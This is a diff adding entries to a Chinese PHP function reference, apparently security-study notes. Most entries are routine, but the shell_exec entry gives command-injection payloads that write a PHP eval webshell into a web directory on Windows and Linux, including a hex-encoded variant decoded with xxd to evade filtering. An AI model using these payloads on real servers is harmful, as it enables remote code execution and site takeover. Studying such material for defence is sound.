@@ -172,6 +172,22 @@ str_replace("\r","",$c);
 
 ---
 
+### stripslashes
+
+反引用一个引用字符串
+
+#### 原型
+
+~~~php
+stripslashes ( string $str ) : string
+~~~
+
+#### 返回值
+
+返回一个去除转义反斜线后的字符串（*\\'* 转换为 *'* 等等）。双反斜线（*\\\\*）被转换为单个反斜线（*\\*）。
+
+---
+
 ### substr() 
 
 substr() 函数返回字符串的一部分
@@ -181,6 +197,71 @@ substr(string,start,length)
 ```
 
 ---
+
+### fnmatch
+
+用模式匹配文件名
+
+#### 原型
+
+~~~php
+fnmatch ( string $pattern , string $string [, int $flags = 0 ] ) : bool
+~~~
+
+**fnmatch()** 检查传入的 `string` 是否匹配给出的 shell 统配符 `pattern`。
+
+匹配则返回 **TRUE**，否则返回 **FALSE**。
+
+---
+
+### shell_exec
+
+通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
+
+#### 原型
+
+~~~php
+ shell_exec ( string $cmd ) : string
+~~~
+
+windows下连接命令的符号：**&&、&、|、||**命令拼接符号的区别
+
+- A&B  简单的拼接，AB之间无制约关系
+- A&&B   A执行成功，然后才会执行B
+- A|B  A的输出，作为B的输入
+- A||B  A执行失败，然后才会执行B
+
+windows下命令注入写webshell：
+
+用^转义<
+
+~~~php
+echo ^<?php eval($_POST[pass]); ?^> > web目录shell.php
+~~~
+
+如果加上单引号会写不进去，如果加双引号会把双引号一起写进去，所以要用^转义<
+
+~~~php
+echo '<?php eval($_POST[pass]); ?>' > web目录shell.php
+~~~
+
+linux下命令注入写webshell：
+
+linux下需要用单引号来转义<，不过很多php都默认开启gpc，可以先用16进制转换一句话再用xxd命令把16进制还原.
+
+~~~php
+echo '<?php eval($_POST[pass]);>' > web目录/shell.php
+~~~
+
+~~~php
+echo 3c3f706870206576616c28245f504f53545b706173735d293b3e|xxd -r -ps > web目录/shell.php
+~~~
+
+
+
+---
+
+
 
 ### fwrite()
 
@@ -318,6 +399,20 @@ ereg函数**存在NULL截断漏洞**，导致了正则过滤被绕过,所以**�
 
 ---
 
+### strrpos
+
+计算指定字符串在目标字符串中最后一次出现的位置
+
+#### 原型
+
+~~~php
+strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int
+~~~
+
+返回字符串 `haystack` 中 `needle` 最后一次出现的数字位置。
+
+---
+
 ### stristr() 
 
 stristr() 函数搜索字符串在另一字符串中的第一次出现。
@@ -373,6 +468,46 @@ echo GREETING;
 - `include`与`require`的区别：
   - require **会生成致命错误**（E_COMPILE_ERROR）并停止脚本
   - include **只生成警告**（E_WARNING），并且脚本会继续
+
+---
+
+### $_FILES
+
+HTTP 文件上传变量,通过 HTTP POST 方式上传到当前脚本的项目的数组。
+
+-  [$_FILES['userfile'\]['name']](https://www.php.net/manual/zh/reserved.variables.files.php)
+
+  ​                客户端机器文件的原名称。             
+
+-  [$_FILES['userfile'\]['type']](https://www.php.net/manual/zh/reserved.variables.files.php)
+
+  ​                文件的 MIME 类型，如果浏览器提供此信息的话。一个例子是“*image/gif*”。不过此        MIME 类型在 PHP 端并不检查，因此不要想当然认为有这个值。              
+
+-  [$_FILES['userfile'\]['size']](https://www.php.net/manual/zh/reserved.variables.files.php)
+
+  ​                已上传文件的大小，单位为字节。             
+
+-  [$_FILES['userfile'\]['tmp_name']](https://www.php.net/manual/zh/reserved.variables.files.php)
+
+  ​                文件被上传后在服务端储存的临时文件名。             
+
+-  [$_FILES['userfile'\]['error']](https://www.php.net/manual/zh/reserved.variables.files.php)
+
+  ​                和该文件上传相关的[错误代码](https://www.php.net/manual/zh/features.file-upload.errors.php)。此项目是在        PHP 4.2.0 版本中增加的。             
+
+---
+
+### move_uploaded_file
+
+ 将上传的文件移动到新位置
+
+#### 原型
+
+~~~php
+ move_uploaded_file ( string $filename , string $destination ) : bool
+~~~
+
+本函数检查并确保由 `filename`指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST上传机制所上传的）。如果文件合法，则将其移动为由`destination` 指定的文件。
 
 ---
 
@@ -520,6 +655,22 @@ echo GREETING;
 - *'r'*：版本名称，例如：           *5.1.2-RELEASE*。                   
 -  *'v'*：版本信息。操作系统之间有很大的不同。                   
 -  *'m'*：机器类型。例如：*i386*。              
+
+---
+
+### basename
+
+返回路径中的文件名部分。
+
+#### 原型
+
+~~~php
+ basename ( string $path [, string $suffix ] ) : string
+~~~
+
+给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。
+
+如果文件名是以`suffix` 结束的，那这一部分也会被去掉。
 
 ---
 
